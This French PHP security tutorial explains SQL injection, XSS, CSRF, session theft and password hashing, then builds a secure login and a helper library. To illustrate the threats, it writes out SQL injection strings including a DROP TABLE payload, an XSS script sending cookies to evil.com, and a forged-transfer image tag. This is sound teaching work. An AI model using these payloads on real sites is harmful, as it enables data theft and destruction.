# Sécurité

# Étape 14 — Sécurité

## 1. La théorie complète

La sécurité n'est pas une fonctionnalité qu'on ajoute à la fin — c'est une **façon de coder** dès le départ.

### Les 5 menaces principales en PHP

```
1. Injection SQL      → Manipuler tes requêtes SQL
2. XSS                → Injecter du JavaScript malveillant
3. CSRF               → Forcer un utilisateur à faire une action
4. Session Hijacking  → Voler la session d'un utilisateur
5. Mots de passe      → Stocker les MDP en clair
```

### 1. Injection SQL

C'est la faille la plus destructrice — elle permet de **lire, modifier ou supprimer** toute ta base de données.

```php
// ❌ VULNÉRABLE — concaténation directe
$email = $_POST['email'];
$sql   = "SELECT * FROM users WHERE email = '$email'";

// Un attaquant envoie comme email :
// ' OR '1'='1
// La requête devient :
// SELECT * FROM users WHERE email = '' OR '1'='1'
// → Retourne TOUS les utilisateurs !

// Pire — il peut envoyer :
// '; DROP TABLE users; --
// SELECT * FROM users WHERE email = ''; DROP TABLE users; --
// → Supprime toute la table !
```

```php
// ✅ SÉCURISÉ — requêtes préparées PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
// Le ? est traité comme une valeur pure — jamais comme du SQL
// Même si l'attaquant envoie du SQL, il sera traité comme texte
```

### 2. XSS — Cross-Site Scripting

Le XSS permet d'**injecter du JavaScript** dans ta page qui sera exécuté par les navigateurs des autres utilisateurs.

```php
// ❌ VULNÉRABLE — affichage direct
$commentaire = $_POST['commentaire'];
echo $commentaire;

// Un attaquant envoie :
// <script>document.location='http://evil.com?cookie='+document.cookie</script>
// → Vole les cookies de session de tous les visiteurs !
```

```php
// ✅ SÉCURISÉ — htmlspecialchars avant tout affichage
$commentaire = htmlspecialchars($_POST['commentaire'], ENT_QUOTES, 'UTF-8');
echo $commentaire;
// <script> devient &lt;script&gt; — affiché comme texte, pas exécuté

// Règle d'or :
// TOUT ce qui vient de l'utilisateur et qui est affiché
// doit passer par htmlspecialchars()
```

### 3. CSRF — Cross-Site Request Forgery

Le CSRF force un utilisateur **connecté** à effectuer une action à son insu.
```
Scénario :
1. Alice est connectée sur ta banque
2. Alice visite un site malveillant
3. Ce site contient :
   <img src="https://mabanque.com/virement?montant=1000&vers=attaquant">
4. La banque reçoit la requête avec les cookies d'Alice
5. Le virement est effectué sans qu'Alice le sache !
```

```php
// ✅ Protection CSRF — token unique par formulaire

// Générer le token lors de l'affichage du formulaire
function genererTokenCSRF(): string
{
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Vérifier le token lors de la soumission
function verifierTokenCSRF(string $token): bool
{
    if (empty($_SESSION['csrf_token'])) {
        return false;
    }
    // hash_equals — comparaison sécurisée contre les timing attacks
    return hash_equals($_SESSION['csrf_token'], $token);
}
```

```php
<!-- Dans chaque formulaire -->
<form method="POST">
    <input type="hidden"
           name="csrf_token"
           value="<?= genererTokenCSRF() ?>">
    <!-- autres champs -->
</form>
```

```php
// Lors du traitement POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $token = $_POST['csrf_token'] ?? '';

    if (!verifierTokenCSRF($token)) {
        http_response_code(403);
        die("Requête invalide — token CSRF manquant ou incorrect");
    }

    // Traitement sécurisé...
}
```

### 4. Session Hijacking — Vol de session

```php
// ✅ Protections contre le vol de session

session_start();

// 1. Régénérer l'ID après connexion — empêche la fixation de session
session_regenerate_id(true);

// 2. Lier la session à l'IP et au User-Agent
// (Un attaquant qui vole le cookie ne peut pas l'utiliser
// depuis un autre navigateur/IP)
function validerSession(): bool
{
    $ip        = $_SERVER['REMOTE_ADDR']     ?? '';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $empreinte = hash('sha256', $ip . $userAgent);

    if (!isset($_SESSION['empreinte'])) {
        // Première visite — on enregistre l'empreinte
        $_SESSION['empreinte'] = $empreinte;
        return true;
    }

    // Visites suivantes — on vérifie
    return hash_equals($_SESSION['empreinte'], $empreinte);
}

// 3. Configurer les cookies de session
ini_set('session.cookie_httponly', '1');   // Inaccessible en JS
ini_set('session.cookie_secure',   '1');   // HTTPS uniquement
ini_set('session.cookie_samesite', 'Strict'); // Pas envoyé en cross-site

// 4. Durée de vie limitée
ini_set('session.gc_maxlifetime', '1800'); // 30 minutes
```

### **5. Hash de mots de passe**

```php
// ❌ JAMAIS stocker un mot de passe en clair
$password = "motdepasse123";
INSERT INTO users SET password = '$password'
// Si la DB est compromise → tous les mots de passe sont exposés !

// ❌ JAMAIS utiliser MD5 ou SHA1
$hash = md5($password);    // Cassable en secondes
$hash = sha1($password);   // Idem

// ✅ password_hash — bcrypt par défaut
$hash = password_hash($password, PASSWORD_BCRYPT);
// "$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
// Le hash est différent à chaque appel — même mot de passe !
// Il contient le sel et le coût — tout est dans le hash

// ✅ password_verify — comparer le mot de passe et le hash
if (password_verify($passwordSaisi, $hashEnDB)) {
    echo "Mot de passe correct !";
} else {
    echo "Mot de passe incorrect !";
}

// ✅ PASSWORD_BCRYPT vs PASSWORD_ARGON2ID
// BCRYPT    — standard, bien supporté
// ARGON2ID  — plus moderne, recommandé si PHP >= 7.3
$hash = password_hash($password, PASSWORD_ARGON2ID);
```

### **6. Validation et filtrage des entrées**

```php
// ── Valider un email ─────────────────────────────────────
$email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
if ($email === false) {
    $erreurs[] = "Email invalide";
}

// ── Valider un entier dans une plage ─────────────────────
$age = filter_var($_POST['age'] ?? '', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 18, 'max_range' => 120]
]);
if ($age === false) {
    $erreurs[] = "Âge invalide";
}

// ── Valider une URL ──────────────────────────────────────
$url = filter_var($_POST['url'] ?? '', FILTER_VALIDATE_URL);

// ── Nettoyer un entier ───────────────────────────────────
$id = filter_var($_POST['id'] ?? 0, FILTER_SANITIZE_NUMBER_INT);

// ── Liste blanche — toujours préférer ────────────────────
$statuts   = ['publie', 'brouillon'];
$statut    = $_POST['statut'] ?? '';

if (!in_array($statut, $statuts, true)) {
    $erreurs[] = "Statut invalide";
}
```

### **7. Headers de sécurité HTTP**

```php
// À envoyer dans chaque page — idéalement dans index.php

// Empêche le navigateur de deviner le type MIME
header('X-Content-Type-Options: nosniff');

// Empêche l'affichage dans une iframe (clickjacking)
header('X-Frame-Options: DENY');

// Active la protection XSS du navigateur
header('X-XSS-Protection: 1; mode=block');

// Content Security Policy — définit les sources autorisées
header("Content-Security-Policy: default-src 'self'");

// Force HTTPS
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
```

## **2. Exemple concret — système de connexion sécurisé complet**

```php
<?php
declare(strict_types=1);

/**
 * login.php — version sécurisée complète
 */

session_start();

// Headers de sécurité
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');

// Déjà connecté
if (isset($_SESSION['user']) && $_SESSION['user']['connecte'] === true) {
    header('Location: ' . APP_URL . '?page=dashboard');
    exit;
}

$erreurs = [];
$email   = '';

// Limite les tentatives de connexion — anti brute-force
const MAX_TENTATIVES = 5;
const DUREE_BLOCAGE  = 900; // 15 minutes en secondes

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // ── Vérification CSRF ────────────────────────────────
    $csrfToken = $_POST['csrf_token'] ?? '';
    if (!verifierTokenCSRF($csrfToken)) {
        http_response_code(403);
        die("Requête invalide");
    }

    // ── Anti brute-force ─────────────────────────────────
    $cle          = 'tentatives_' . $_SERVER['REMOTE_ADDR'];
    $tentatives   = $_SESSION[$cle]['count'] ?? 0;
    $dernierEssai = $_SESSION[$cle]['last']  ?? 0;

    // Réinitialiser si le délai de blocage est passé
    if (time() - $dernierEssai > DUREE_BLOCAGE) {
        $tentatives = 0;
    }

    if ($tentatives >= MAX_TENTATIVES) {
        $resteSecondes = DUREE_BLOCAGE - (time() - $dernierEssai);
        $erreurs[] = "Trop de tentatives. Réessayez dans " . ceil($resteSecondes / 60) . " minute(s).";
    }

    if (empty($erreurs)) {

        $email    = trim($_POST['email']    ?? '');
        $password = $_POST['password']      ?? '';

        // ── Validation ───────────────────────────────────
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $erreurs[] = "Email ou mot de passe incorrect";
        }

        if (empty($password)) {
            $erreurs[] = "Email ou mot de passe incorrect";
        }
    }

    if (empty($erreurs)) {

        try {
            $pdo  = getConnexion();
            $stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = ?");
            $stmt->execute([$email]);
            $user = $stmt->fetch();

            // ── Vérification password_verify ─────────────
            if (!$user || !password_verify($password, $user['password'])) {

                // Incrémenter le compteur de tentatives
                $_SESSION[$cle] = [
                    'count' => $tentatives + 1,
                    'last'  => time()
                ];

                // Message GÉNÉRIQUE — ne pas préciser email ou MDP
                $erreurs[] = "Email ou mot de passe incorrect";

            } else {

                // ── Connexion réussie ─────────────────────
                // Réinitialiser le compteur
                unset($_SESSION[$cle]);

                // Régénérer l'ID de session — anti fixation
                session_regenerate_id(true);

                // Stocker les infos minimales nécessaires
                $_SESSION['user'] = [
                    'id'       => $user['id'],
                    'prenom'   => $user['prenom'],
                    'role'     => $user['role'],
                    'connecte' => true,
                ];

                // Empreinte de session
                $_SESSION['empreinte'] = hash('sha256',
                    ($_SERVER['REMOTE_ADDR']     ?? '') .
                    ($_SERVER['HTTP_USER_AGENT'] ?? '')
                );

                header('Location: ' . APP_URL . '?page=dashboard');
                exit;
            }

        } catch (PDOException $e) {
            loggerErreur($e);
            $erreurs[] = "Une erreur est survenue. Veuillez réessayer.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion — <?= APP_NAME ?></title>
</head>
<body>

<?php if (!empty($erreurs)) : ?>
    <ul style="color:red">
        <?php foreach ($erreurs as $e) : ?>
            <li><?= htmlspecialchars($e, ENT_QUOTES, 'UTF-8') ?></li>
        <?php endforeach; ?>
    </ul>
<?php endif; ?>

<form method="POST" action="">

    <!-- Token CSRF caché dans chaque formulaire -->
    <input type="hidden" name="csrf_token" value="<?= genererTokenCSRF() ?>">

    <div>
        <label for="email">Email</label><br>
        <input type="email" id="email" name="email"
               value="<?= htmlspecialchars($email, ENT_QUOTES, 'UTF-8') ?>">
    </div>
```

## **3. Bonnes pratiques et erreurs à éviter**

```php
// ❌ Stocker des infos sensibles en session
```

### **`src/helpers/security.php`**

```php
<?php
declare(strict_types=1);

/**
 * security.php
 * Fonctions de sécurité centralisées
 */

// ============================================================
// CSRF
// ============================================================

/**
 * Génère un token CSRF unique et le stocke en session
 * Appelé dans chaque formulaire pour générer le champ caché
 *
 * @return string Token CSRF hexadécimal de 64 caractères
 */
function genererTokenCSRF(): string
{
    if (empty($_SESSION['csrf_token'])) {
        // random_bytes — générateur cryptographiquement sûr
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Vérifie le token CSRF soumis contre celui en session
 * hash_equals — comparaison en temps constant (anti timing-attack)
 *
 * @param string $token Token reçu du formulaire
 * @return bool         True si valide
 */
function verifierTokenCSRF(string $token): bool
{
    if (empty($_SESSION['csrf_token'])) {
        return false;
    }
    return hash_equals($_SESSION['csrf_token'], $token);
}

/**
 * Régénère le token CSRF après utilisation
 * Bonne pratique — un token = une soumission
 */
function regenererTokenCSRF(): void
{
    unset($_SESSION['csrf_token']);
    genererTokenCSRF();
}

// ============================================================
// MOTS DE PASSE
// ============================================================

/**
 * Hash un mot de passe avec bcrypt
 * cost => 12 = bon équilibre sécurité/performance
 *
 * @param string $password Mot de passe en clair
 * @return string          Hash bcrypt
 */
function hasherMotDePasse(string $password): string
{
    return password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
}

/**
 * Vérifie un mot de passe contre son hash bcrypt
 *
 * @param string $password Mot de passe saisi
 * @param string $hash     Hash stocké en base de données
 * @return bool            True si correspond
 */
function verifierMotDePasse(string $password, string $hash): bool
{
    return password_verify($password, $hash);
}

// ============================================================
// ÉCHAPPEMENT
// ============================================================

/**
 * Échappe une valeur pour affichage HTML sécurisé
 * Raccourci pour htmlspecialchars avec les bons paramètres
 *
 * @param string $valeur Valeur brute
 * @return string        Valeur échappée
 */
function escape(string $valeur): string
{
    return htmlspecialchars($valeur, ENT_QUOTES, 'UTF-8');
}

// ============================================================
// HEADERS HTTP
// ============================================================

/**
 * Envoie les headers de sécurité HTTP
 * À appeler AVANT tout output HTML
 */
function envoyerHeadersSecurite(): void
{
    // Empêche le navigateur de deviner le type MIME
    header('X-Content-Type-Options: nosniff');

    // Empêche l'affichage dans une iframe — anti clickjacking
    header('X-Frame-Options: DENY');

    // Active la protection XSS du navigateur
    header('X-XSS-Protection: 1; mode=block');

    // Référant limité — pas d'URL complète transmise
    header('Referrer-Policy: strict-origin-when-cross-origin');
}

// ============================================================
// ANTI BRUTE-FORCE
// ============================================================

const MAX_TENTATIVES   = 5;
const DUREE_BLOCAGE    = 900; // 15 minutes

/**
 * Vérifie si l'IP est bloquée après trop de tentatives
 *
 * @return bool True si bloquée
 */
function estBloqueeBruteForce(): bool
{
    $cle          = 'tentatives_' . ($_SERVER['REMOTE_ADDR'] ?? '');
    $tentatives   = $_SESSION[$cle]['count'] ?? 0;
    $dernierEssai = $_SESSION[$cle]['last']  ?? 0;

    // Réinitialiser si délai de blocage dépassé
    if (time() - $dernierEssai > DUREE_BLOCAGE) {
        unset($_SESSION[$cle]);
        return false;
    }

    return $tentatives >= MAX_TENTATIVES;
}

/**
 * Retourne le nombre de secondes restantes avant déblocage
 *
 * @return int Secondes restantes
 */
function secondesAvantDeblocage(): int
{
    $cle          = 'tentatives_' . ($_SERVER['REMOTE_ADDR'] ?? '');
    $dernierEssai = $_SESSION[$cle]['last'] ?? 0;

    return max(0, DUREE_BLOCAGE - (time() - $dernierEssai));
}

/**
 * Incrémente le compteur de tentatives échouées
 */
function enregistrerTentativeEchouee(): void
{
    $cle = 'tentatives_' . ($_SERVER['REMOTE_ADDR'] ?? '');

    $_SESSION[$cle] = [
        'count' => ($_SESSION[$cle]['count'] ?? 0) + 1,
        'last'  => time()
    ];
}

/**
 * Réinitialise le compteur après connexion réussie
 */
function reinitialiserTentatives(): void
{
    $cle = 'tentatives_' . ($_SERVER['REMOTE_ADDR'] ?? '');
    unset($_SESSION[$cle]);
}

// ============================================================
// SESSION
// ============================================================

/**
 * Génère l'empreinte de session basée sur IP + User-Agent
 *
 * @return string Hash SHA256 de l'empreinte
 */
function genererEmpreinteSession(): string
{
    return hash('sha256',
        ($_SERVER['REMOTE_ADDR']     ?? '') .
        ($_SERVER['HTTP_USER_AGENT'] ?? '')
    );
}

/**
 * Valide que la session appartient bien au même navigateur/IP
 *
 * @return bool True si valide
 */
function validerEmpreinteSession(): bool
{
    if (!isset($_SESSION['empreinte'])) {
        return false;
    }
    return hash_equals($_SESSION['empreinte'], genererEmpreinteSession());
}

/**
 * Protège une page — redirige si non connecté ou session invalide
 *
 * @param string $role Rôle requis (optionnel)
 */
function protegerPage(string $role = ''): void
{
    if (
        !isset($_SESSION['user']) ||
        $_SESSION['user']['connecte'] !== true ||
        !validerEmpreinteSession()
    ) {
        header('Location: ' . APP_URL . '?page=login');
        exit;
    }

    if ($role !== '' && $_SESSION['user']['role'] !== $role) {
        http_response_code(403);
        die("Accès refusé — rôle insuffisant");
    }
}
```

```php
<?php
declare(strict_types=1);

/**
 * login.php — version sécurisée complète
 */

$titrePage = "Connexion";

// Déjà connecté → rediriger
if (isset($_SESSION['user']) && $_SESSION['user']['connecte'] === true) {
    header('Location: ' . APP_URL . '?page=dashboard');
    exit;
}

$erreurs = [];
$email   = $_COOKIE['remember_email'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // ── Vérification CSRF ────────────────────────────────
    if (!verifierTokenCSRF($_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        die("Requête invalide");
    }

    // ── Anti brute-force ─────────────────────────────────
    if (estBloqueeBruteForce()) {
        $minutes   = ceil(secondesAvantDeblocage() / 60);
        $erreurs[] = "Trop de tentatives. Réessayez dans {$minutes} minute(s).";
    }

    if (empty($erreurs)) {

        $email    = trim($_POST['email']    ?? '');
        $password = $_POST['password']      ?? '';
        $remember = isset($_POST['remember']);

        // ── Validation basique ───────────────────────────
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $erreurs[] = "Email ou mot de passe incorrect";
        }

        if (empty($password)) {
            $erreurs[] = "Email ou mot de passe incorrect";
        }
    }

    if (empty($erreurs)) {
        try {
            $pdo  = getConnexion();
            $stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = ?");
            $stmt->execute([$email]);
            $user = $stmt->fetch();

            // ── Vérification MDP avec password_verify ────
            if (!$user || !verifierMotDePasse($password, $user['password'])) {

                enregistrerTentativeEchouee();
                // Message générique — ne révèle pas email ou MDP
                $erreurs[] = "Email ou mot de passe incorrect";

            } else {

                // ── Connexion réussie ─────────────────────
                reinitialiserTentatives();

                // Anti fixation de session
                session_regenerate_id(true);

                // Stocker le minimum nécessaire
                $_SESSION['user'] = [
                    'id'       => $user['id'],
                    'prenom'   => $user['prenom'],
                    'role'     => $user['role'],
                    'connecte' => true,
                ];

                // Empreinte IP + User-Agent
                $_SESSION['empreinte'] = genererEmpreinteSession();

                // "Se souvenir de moi" — cookie 30 jours
                if ($remember) {
                    setcookie(
                        'remember_email',
                        $email,
                        time() + 2592000,
                        '/',
                        '',
                        false,
                        true   // httponly
                    );
                } else {
                    setcookie('remember_email', '', time() - 3600, '/');
                }

                regenererTokenCSRF();

                header('Location: ' . APP_URL . '?page=dashboard');
                exit;
            }

        } catch (PDOException $e) {
            loggerErreur($e);
            $erreurs[] = "Une erreur est survenue. Veuillez réessayer.";
        }
    }
}
```

```php
 * Déconnexion complète et sécurisée

session_unset();
```

```
┌─────────────────────────────────────────────────────────────┐
│  LES 5 RÈGLES D'OR                                         │
│                                                             │
│  1. INJECTION SQL                                           │
│     Jamais de variable dans une requête SQL                 │
│     Toujours les requêtes préparées PDO                     │
│                                                             │
│  2. XSS                                                     │
│     Tout ce qui vient de l'utilisateur et est affiché       │
│     → escape() = htmlspecialchars(ENT_QUOTES, UTF-8)       │
│                                                             │
│  3. CSRF                                                    │
│     Tout formulaire POST → token CSRF caché                 │
│     Vérifié avec hash_equals() avant traitement             │
│                                                             │
│  4. MOTS DE PASSE                                           │
│     Jamais en clair — jamais MD5/SHA1                       │
│     password_hash() → password_verify()                     │
│                                                             │
│  5. SESSIONS                                                │
│     session_regenerate_id(true) après connexion             │
│     Empreinte IP + User-Agent                               │
│     Cookies : httponly + secure + samesite                  │
└─────────────────────────────────────────────────────────────┘
```
